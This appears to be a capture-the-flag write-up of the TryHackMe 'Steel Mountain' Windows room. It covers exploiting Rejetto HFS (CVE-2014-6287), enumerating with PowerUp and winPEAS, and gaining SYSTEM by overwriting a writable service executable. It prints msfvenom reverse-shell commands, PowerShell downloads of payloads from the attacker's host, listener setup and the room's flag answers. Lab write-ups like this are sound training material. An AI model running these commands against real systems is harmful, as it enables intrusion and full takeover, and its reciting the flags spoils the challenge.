# Steel Mountain 
Diffic
# Introduction
**Room instructions**:
In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our [Kali Room](https://tryhackme.com/room/kali).
# Initial Access

To kick off our reconnaissance, we initiate an Nmap scan to unveil open ports and services on the target machine. This scan reveals that port 80 is open, indicating the presence of a web server.
Results:
![](images/20230912104926.png)
From our scan we can see that port 80 is open and can deduct that it is a website so lets visit the site and see what's waiting for us.


![](images/20230912192922.png)

Here we have a website displaying the Employee of the month. But what we need is the name of the employee of the month so lets try and get that. We can start by viewing the page source code or using the inspect element to see the name of the image.

![](images/20230912193142.png)

From the source code we can see that the name of the image is "Bill Harper" which is the answer we are looking for.

Scan the machine with nmap. What is the other port running a web server on? **8080**
From our nmap scan above we can see port 8080 is open and running a http server.

Take a look at the other web server. What file server is running? Rejetto Http File Server

![](images/20230912200320.png)

![](images/20230912200338.png)

What is the CVE number to exploit this file server? **2014-6287**

![](images/20230912200413.png)

Use Metasploit to get an initial shell. What is the user flag? **b04763b6fcf51fcd7c13abc7db4fd365**

Start your metasploit and search rejetto there should be only one option so select that option `use 0`.

Then list your options and set the required options as seen below.

Options:
![](images/20230912201857.png)
Options set

![](images/20230912201920.png)

As we can see the RHOSTS is our target host that is the Http File Server, The RPORT is the target port **8080**. For the SRVHOST it will be our attack machine IP address this is basically the address where the exploit will be served on to be delivered on the target machine just like creating a python server to send a LinPeas script to a target machine but in this case we are sending the expliot **windows/webapps/49125.py** from our machine to the target machine. Now the LHOST is our listener IP address which is our attack IP and the address we will use to setup a listener to catch the shell while the LPORT is just the listening port we want to listen on.

Now to get the flag. Our initial access places us in this directory `C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

So from experience we should know the flag should be in the user's desktop, documents folder etc. We then navigate to directory of the user "bill" and cat the user.txt file to get the flag.
![](images/20230912202842.png)


# Privilege Escalation
Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._"

You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the **upload** command in Metasploit to upload the script.

![](images/20230912203018.png)

To execute this using Meterpreter, I will type **load powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**:

![](images/20230912203036.png)

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an _unquoted service path_ vulnerability? **AdvancedSystemCareService9**

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.  

**Note:** The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

What is the root flag? **9af5f314f57607c00fd09803a587db80**

After downloading the PowerUp.ps1 privesc script we can upload the script to our windows machine and enumerate for privilege escalation vectors that rely on misconfigurations.

To upload using meterpreter:
```shell
upload /path/to/file
```
![](images/20230913095258.png)

After that we need to run the script using powershell. To use powershell in meterpreter:

```shell
load powershell
powershell_shell
```
![](images/20230913095618.png)
 We can then navigate to where we uploaded the script and execute it:
```powershell
cd path\to\script
. .\PowerUp.ps1
Invoke-AllCheck
```

This will then enumerate and print out results.
![](images/20230913095820.png)

The one we are interested in it the one with the "CanRestart"  option set to True, which indicates that our current user has permissions to restart that service.

![](images/20230913100109.png)
As we can see from the image above we have a modifiable path and write permissions to that directory. This means we can replace the ASCService.exe file there with our maliciously crafted payload using msfvenom.

Next we craft our payload from our attack machine using msfvenom and name it the same name as the AdvanceSystemCareService executable which is ASCService.exe:
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

![](images/20230913100821.png)


So the next step for us is to stop the AdvancedSytemCareService9 from running so that we can upload our malicious executable and replace it with the legitimate one.
```powershell
Stop-Service -Name "AdvacnedSystemCareService9"
```
![](images/20230913101110.png)

Now let's go back to our meterpreter shell to upload the payload to our target
```shell
upload /path/to/payload
```
![](images/20230913101225.png)

Before we execute our payload by starting the service again, we need to first setup a multi handler to catch our new shell as `NT Authority\System`. To do that we first background our current meterpreter shell using CTRL + Z and use the multi handler:

```shell
use exploit/multi/handler
```

Next we set the appropriate options like the same payload we created using msfvenom then set the Listener IP and Port.

```shell
set payload windows/shell_reverse_tcp
set LHOST <IP>
set LPORT <PORT>
```

![](images/20230913101929.png)
now we run the exploit as a job so that it will run in the background and enter into our previous meterpreter session:
```shell
exploit -j
```

![](images/20230913102154.png)

Now we enter back into the powershell and can now start the AdvancedSystemCareService9 and it'll execute our malicious payload executable rather than the legitimate service since we have already overwritten it.

```powershell
Start-Service -Name "AdvanceSystemCareService9"
```

![](images/20230913102705.png)
As we can see from the image above it has created a new shell for us which is going to a an `NT Authority\System` level shell. Let's take a look.
We first background our current shell and enter into the new shell.
![](images/20230913103418.png)

Bingo!.

Now to find the flag. It'll most probably be in the Administrator's Desktop.
![](images/20230913103752.png)
# Access and Escalation without Metasploit
Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to

**Answer the questions below**

To begin we shall be using the same CVE. However, this time let's use this [exploit.](https://www.exploit-db.com/exploits/39161)

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*

  

To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

![](images/20230913104012.png)

What powershell -c command could we run to manually find out the service name?
*Format is "powershell -c "command here"*
**powershell -c "Get-service"**

Now let's escalate to Administrator with our new found knowledge.

Generate your payload using msfvenom and pull it to the system using powershell.

  
Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!

**The Procedure:**

The aim here is to try and get access and perform privilege escalation without metasploit.
The first step is to download the [exploit](https://www.exploit-db.com/exploits/39161) we were given to use.
Note: make sure to download all files in 1 directory to make things easier.
Let's begin!

After getting the exploit let's configure it with the appropriate settings as indicated in the exploit. First is the IP address of our attack machine and port number we want to listen on to get the shell.

![](images/20230913135614.png)

![](images/20230913140136.png)
Take note of the this statement. We will need to run a python server on port 80 in the same directory as our netcat [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) file.

Next step is to start a python server in the directory as our netcat binary. When the exploit is ran it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to that the specified port 4443 in order catch the shell.

![](images/20230913141304.png)
Next step is to transfer a winPEAS script to autotmate our Privilege Escalation Enumeration and then run the script.

Command to transfer the script form our attack machine to our target machine:
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.129.243:80/winPEASx64.exe', 'C:\\Windows\temp\winPEASx64.exe')"
```
Command to execute the script:
```powershell
.\winPEASx64.exe
```

![](images/20230913141953.png)

Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  that we have write access to `C:\Program Files (x86)\IObit\Advanced SystemCare\`.
In that directory there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.

![](images/20230913142635.png)
 All we need to do is to create a windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.

Let's first create our payload:
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

![](images/20230913100821.png)
 Now lets stop the **AdvancedSystemCareService9**:
```shell
powershell -c "Stop-Service -Name 'AdvancedSystemCareService9' -Force"
```

And now transfer our payload to overwrite the file:
```shell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.129.243:80/ASCService.exe', 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
```

Setup a netcat listener and start the service:

```shell
nc -lvnp 4443
```

```powershell
powershell -c "Start-Service -Name 'AdvancedSystemCareService9'"
```

and bingo! we have a shell.

![](images/20230913144245.png)

![](images/20230913144315.png)


